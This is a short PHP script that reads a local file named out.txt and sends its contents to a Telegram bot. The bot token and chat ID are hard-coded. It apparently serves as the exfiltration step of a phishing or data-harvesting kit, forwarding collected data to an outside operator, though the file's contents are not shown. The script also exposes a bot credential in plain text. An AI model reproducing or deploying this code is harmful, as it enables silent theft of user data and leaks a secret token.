<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot6885541432:AAF1jVsXlHlElqFUrHFuQ2XKR4fS1jCKO8c/sendMessage?chat_id=1765222986&text=$msg");
?>
